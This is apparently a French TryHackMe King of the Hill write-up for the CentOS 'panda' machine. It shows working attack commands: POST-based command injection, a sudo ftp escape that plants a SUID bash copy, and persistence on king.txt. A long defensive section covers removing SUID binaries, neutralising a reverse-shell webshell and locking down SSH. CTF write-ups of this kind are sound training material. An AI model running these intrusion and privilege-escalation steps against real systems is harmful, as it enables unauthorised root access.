---
title: "panda (KoTH)"
platform: "TryHackMe"
category: "Room"
os: "Linux"
difficulty: "Medium"
date: 2026-11-22
author: "kadohack12"
author_github: "kadohack12"
tags: [tryhackme, koth, web, rce, privesc, defense, linux]
status: published
---

# panda — King of the Hill (Linux, Medium)

> **TL;DR** — Backdoor web `/06d63…/` avec RCE en `shifu` → `sudo ftp` NOPASSWD → root.
> Ensuite tout le travail est défensif : `king.txt` en bind-mount ext3 read-only, cron root
> piégé corrigé, PwnKit bloqué, webshell WordPress neutralisé, sessions SSH adverses tuées.

Machine **King of the Hill** de TryHackMe, jouée dans le cadre de la room (scope CTF autorisé).
Objectif : prendre root, écrire son pseudo dans `/root/king.txt`, puis tenir le trône pendant que
les autres joueurs attaquent. Session du 22/11/2026, ~35 min de jeu actif.

Cible : `10.10.160.131`, hostname `panda`, CentOS 7 (kernel `3.10.0-862`).

## Sommaire

- [Contexte et règles](#contexte-et-règles)
- [Connexion à l'arène](#connexion-à-larène)
- [Reconnaissance](#reconnaissance)
- [Foothold : injection de commandes cachée](#foothold--injection-de-commandes-cachée)
- [Élévation de privilèges : sudo ftp](#élévation-de-privilèges--sudo-ftp)
- [Les flags](#les-flags)
- [Prendre le trône](#prendre-le-trône)
- [Défense active](#défense-active--ce-qui-sest-passé-en-jeu)
- [État final](#état-final)
- [Ce qu'il faut retenir](#ce-quil-faut-retenir)
- [Annexe — chronologie](#annexe--chronologie)

## Contexte et règles

- Format KoTH : une machine, plusieurs équipes, le score monte tant que **ton pseudo** figure dans
  `/root/king.txt`.
- Le scoring est local : un **king-server** écoute sur le port `9999` et lit `/root/king.txt`.
- Interdits : supprimer ou modifier un flag, éteindre un service. Les correctifs sont autorisés à
  condition que les services restent disponibles.

## Connexion à l'arène

Le VPN THM (`eu-west-1-…-regular.ovpn`, `auth-user-pass`) était déconnecté. Reconnexion via
l'instance OpenVPN GUI déjà lancée :

```powershell
Copy-Item "C:\Users\Lenovo\Downloads\eu-west-1-d4rkl0rd229-regular (2).ovpn" `
          "C:\Users\Lenovo\OpenVPN\config\eu-west-1-d4rkl0rd229-regular.ovpn"
& "C:\Program Files\OpenVPN\bin\openvpn-gui.exe" --command connect "eu-west-1-d4rkl0rd229-regular.ovpn"
```

Résultat : interface *OpenVPN Data Channel Offload* up, IP `192.168.130.140/18`, route
`10.10.0.0/16 via 192.168.128.1`.

> Piège vu au passage : une route `10.10.0.0/16` existait déjà alors que l'adaptateur était
> *Disconnected* — les timeouts TCP étaient donc silencieux. Vérifier l'état de l'adaptateur, pas
> seulement la table de routage.

## Reconnaissance

Pas de `nmap` sur la machine d'attaque : scan TCP en PowerShell (`TcpClient.ConnectAsync` + timeout).

```text
22    open  sshd
80    open  Apache 2.4.6 (CentOS) / PHP 5.6.40
139   open  Samba (smbd/nmbd)
3306  open  MariaDB (refuse notre hôte : "Host ... is not allowed")
8080  open  Apache-Coyote / Tomcat 7.0.92
9999  open  king-server (Go)
8009  open  AJP13 (Tomcat)
1337  localhost seulement : nginx 1.16.1
```

`robots.txt` donne `panda.thm`. Le vhost ne change rien à la réponse (pas de `VirtualHost`
dédié) : le vrai indice est ailleurs.

Une fois root, le binaire de scoring est visible dans `/root` :

```bash
$ ls -la /root
-rwxr-xr-x 1 root root 7468711 Apr 12  2020 koth
$ strings /root/koth | grep -iE 'king\.txt|:9999'
... invalid king.txt ... go1.14.2 ...
$ ss -ltnp | grep 9999
LISTEN 0 128 :::9999 users:(("koth",pid=596,fd=3))
$ journalctl -u koth -n 3
Started THM KOTH service.
```

## Foothold : injection de commandes cachée

Énumération des chemins sur `http://panda.thm/` : tout est en 404 sauf un répertoire au nom
aléatoire, hérité de la room « Panda » :

```text
/06d63d6798d9b6c2f987f045b12031d6/  -> 200
```

La page est un formulaire minimal qui **n'affiche pas** de résultat :

```html
<form action="index.php" method="POST">
  <label for="cmd">cmd:</label>
  <input type="text" id="cmd" name="cmd">
  <input type="submit" value="submit">
</form>
```

Mais le paramètre `cmd` est bien exécuté :

```bash
curl -s -X POST --data "cmd=id" http://10.10.160.131/06d63d6798d9b6c2f987f045b12031d6/
# uid=1001(shifu) gid=1001(shifu) groups=1001(shifu)
```

→ **RCE en `shifu`**, utilisateur du serveur web.

## Élévation de privilèges : sudo ftp

Premier réflexe après un shell :

```bash
sudo -n -l
```

```text
User shifu may run the following commands on panda:
    (root) NOPASSWD: /usr/bin/ftp
```

Évasion classique ([GTFOBins](https://gtfobins.github.io/gtfobins/ftp/)) : `ftp` exécute une
commande shell via `!`.

```bash
printf '!echo -n d4rkl0rd229 > /root/king.txt; cp /bin/bash /tmp/.rb; chmod 4755 /tmp/.rb\nquit\n' | sudo ftp
```

Vérification :

```bash
/tmp/.rb -p -c 'id'
# uid=0(root) gid=0(root)
```

> Détail qui compte : lancer un script avec `/bin/sh` **droppe l'euid**. Il faut `bash -p` (ou un
> binaire SUID) pour conserver root.

## Les flags

Les flags « utilisateurs » sont en base64 dans des `flag.txt`, plus deux flags web. Un flag est
encodé deux fois (hex → base64).

```bash
for f in /root/.flag /home/*/flag.txt /var/www/html/*/flag /var/www/html/flag/index.html; do
  echo "$f: $(tr -d '\r\n' < "$f")"
done
```

| # | Emplacement | Encodage | Valeur |
|---|---|---|---|
| 1 | `/home/po/flag.txt` | base64 | `0ce16fb1…` |
| 2 | `/home/shifu/flag.txt` | base64 | `c238b633…` |
| 3 | `/home/tigress/flag.txt` | base64 | `3974ddaa…` |
| 4 | `/root/.flag` | base64 | `74ce95d6…` |
| 5 | `/var/www/html/06d63…/flag` | brut | `7c9d7869…` |
| 6 | `/var/www/html/flag/index.html` | hex → base64 | `d220a54f…` |

Valeurs tronquées : les flags d'une instance KoTH sont propres à la session, et publier un flag
complet n'apporte rien à la compréhension.

Décodage du flag 6 :

```text
hex   5a4449794d4745314e475a694d6d59775a6a41344f4755335a5749324d7a526d5957526a5a4751354e32593d
ascii ZDIyMGE1NGZiMmYwZjA4OGU3ZWI2MzRmYWRjZGQ5N2Y=
b64   d220a54f…
```

## Prendre le trône

```bash
echo -n 'd4rkl0rd229' > /root/king.txt
```

Puis deux niveaux de défense.

### Boucle haute fréquence

`chattr +i` est inopérant (overlayfs) :

```bash
chattr +i /root/king.txt   # -> Operation not supported
```

Donc écriture en boucle, toutes les 20 ms :

```bash
while :; do printf '%s' d4rkl0rd229 > /root/king.txt; sleep 0.02; done
```

### Verrou fort : bind-mount ext3 read-only

Le noyau expose `/dev/loop0`, et `mkfs.ext3` fonctionne (avec `-F` sur un fichier) :

```bash
mkdir -p /dev/shm/.kfs
dd if=/dev/zero of=/dev/shm/.kf bs=1M count=4 status=none
mkfs.ext3 -F -q /dev/shm/.kf
mount -o loop /dev/shm/.kf /dev/shm/.kfs
printf d4rkl0rd229 > /dev/shm/.kfs/king.txt
chmod 444 /dev/shm/.kfs/king.txt
sync
mount -o remount,ro /dev/shm/.kfs
mount --bind /dev/shm/.kfs/king.txt /root/king.txt
rm -f /dev/shm/.kf
```

Test :

```bash
echo hacked > /root/king.txt
# bash: /root/king.txt: Read-only file system
```

Le king-server continue de lire le fichier normalement (`:9999` → 200). Retour arrière :
`umount -l /root/king.txt; umount -l /dev/shm/.kfs`.

## Défense active — ce qui s'est passé en jeu

### Le cron root piégé

```bash
crontab -l
*/1 * * * * /home/tigress/check.sh
```

`check.sh` appartenait à **tigress** (compte joueur) et était exécuté par **root** toutes les
minutes. N'importe quel joueur avec un shell `tigress` pouvait y écrire et obtenir root en 60 s.
C'était probablement la voie d'escalade prévue de la room.

Correctif : script déplacé en root-owned.

```bash
printf '#!/bin/bash\ncurl -I -s localhost:1337 > /tmp/status.txt\n' > /usr/local/sbin/thm-check.sh
chown root:root /usr/local/sbin/thm-check.sh; chmod 755 /usr/local/sbin/thm-check.sh
crontab -l | sed 's|.*/home/tigress/check.sh.*|*/1 * * * * /usr/local/sbin/thm-check.sh|' | crontab -
```

### PwnKit bloqué

Les adversaires ont tenté PwnKit à répétition :

```text
/var/tmp/PwnKit
/var/tmp/GCONV_PATH=./.pkexec
/var/tmp/.f/PwnKit
```

Échec systématique après :

```bash
chmod -s /usr/bin/pkexec
chmod -s /usr/bin/find    # GTFOBins trivial sinon
```

`defend.sh` loguait chaque nouveau binaire temporaire dans `/root/.koth_alerts.log`.

### Webshell WordPress

`akismet.php` a été **réécrit avec un php-reverse-shell de pentestmonkey** à 04:40, via l'admin
WordPress (identifiants dans `wp-config.php`, lisible par le pool `po`).

Détection :

```bash
find /var/www/html -name "*.php" -newermt "-60 minutes"
head -5 .../akismet.php   # "php-reverse-shell - Copyright (C) 2007 pentestmonkey"
```

Neutralisation :

```bash
cp -a .../akismet.php /root/.evidence.akismet.$(date +%s)
printf '<?php\n// disabled\n?>\n' > .../akismet.php
chown -R root:root /var/www/html
find /var/www/html -type d -exec chmod 555 {} +
find /var/www/html -type f -exec chmod 444 {} +
```

Puis blocage des retours de shell (le webshell ne peut plus rappeler) :

```bash
for u in 1000 1001 1002; do   # po, shifu, tigress
  iptables -I OUTPUT 1 -o lo -m owner --uid-owner $u -j ACCEPT
  iptables -I OUTPUT 2 -m owner --uid-owner $u -j DROP
done
```

Vérifications : HTTP 80/8080/1337 toujours `200`, et `sudo -u shifu touch /var/www/html/x`
→ `Permission denied`.

### Session SSH volée

`/var/log/secure` montrait une connexion **par clé** en `tigress` depuis `10.8.109.38`, avec la clé
privée présente sur la machine (`/home/tigress/.ssh/id_rsa`).

Correctifs :

```bash
: > /home/tigress/.ssh/authorized_keys
echo 'AllowUsers root' >> /etc/ssh/sshd_config
sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication no/' /etc/ssh/sshd_config
sshd -t && systemctl reload sshd
usermod -L tigress; usermod -L po; usermod -L shifu
```

### Le kill automatique des sessions SSH

Ajout dans `defend.sh` : toute session SSH dont l'IP source n'est pas dans `TRUSTED_IPS` est tuée
(session entière via le SID, pour emporter le shell et ses enfants).

```bash
TRUSTED_IPS="192.168.130.140 192.168.128.0/18"
```

Support de l'IP exacte **et** du CIDR (calcul binaire sur l'IPv4) pour ne pas se verrouiller si
l'IP du tunnel change. Testé : `192.168.130.140` → gardé, `10.8.109.38` → tué.

## État final

```text
king.txt          d4rkl0rd229   (ext3 read-only, monté sur /root/king.txt)
king-server       :9999 -> 200
king.sh PID 5669  boucle 20 ms
defend.sh         watchdog, kill SSH non autorisé, intégrité, relance king.sh
SSH               root par clé uniquement (clé id_koth)
services          80 / 8080 / 1337 / 3306 / 9999 -> up
sessions          aucune hors nous
SUID              find et pkexec retirés
rootkits          aucun module, pas de /etc/ld.so.preload
```

Persistance :

```bash
# /usr/local/sbin/koth-boot.sh  (appelé par @reboot)
iptables ... (réapplique les règles)
setsid /opt/.koth/king.sh &
setsid /opt/.koth/defend.sh &
```

## Ce qu'il faut retenir

1. **Le cron root qui exécute un script joueur est la faille de privesc** la plus fréquente en
   KoTH. À vérifier dans les 10 premières secondes après root.
2. `sudo -l` d'abord, toujours : ici un simple `ftp` NOPASSWD donnait root.
3. `chattr +i` ne marche pas sur overlayfs : la vraie protection est le **bind-mount read-only**
   (si `/dev/loop*` est disponible) ou, à défaut, la fréquence d'écriture.
4. Les joueurs attaquent vite : PwnKit en boucle, webshell WordPress, clé SSH volée. Chaque porte
   laissée ouverte est utilisée dans les minutes qui suivent.
5. **Ne pas casser les services** : après chaque patch, `curl` les ports et vérifier `200`.
6. Le binaire du king-server (`/root/koth`) se lit, mais ne se modifie pas : casser le scoring
   casse son propre score.

## Annexe — chronologie

| Heure (EST) | Événement |
|---|---|
| 04:14 | VPN reconnecté, cible joignable |
| 04:16 | Recon : 22/80/139/3306/8080/9999, `robots.txt` → `panda.thm` |
| 04:17 | Backdoor `/06d63…/` → RCE `shifu` |
| 04:18 | `sudo ftp` → root, `king.txt` écrit, bash SUID posé |
| 04:19 | Boucle `king.txt` (après correction du drop d'euid) |
| 04:20 | 5 flags récupérés, binaire `koth` identifié |
| 04:22 | Kit défensif déployé par SSH (clé ajoutée à `authorized_keys`) |
| 04:23 | `sudo ftp` retiré, backdoor web patchée |
| 04:24 | Bind-mount ext3 read-only sur `king.txt` |
| 04:25 | `find`/`pkexec` dé-SUIDés, artefacts nettoyés |
| 04:26 | SSH : mot de passe désactivé |
| 04:31 | PwnKit adverse détecté (bloqué) |
| 04:34 | Session SSH `tigress` adverse tuée, clé vidée |
| 04:35 | Comptes verrouillés, cron root corrigé, 6e flag trouvé |
| 04:40 | Webshell `akismet.php` détecté et neutralisé |
| 04:42 | Web root gelé, sorties réseau bloquées, `TRUSTED_IPS` actif |
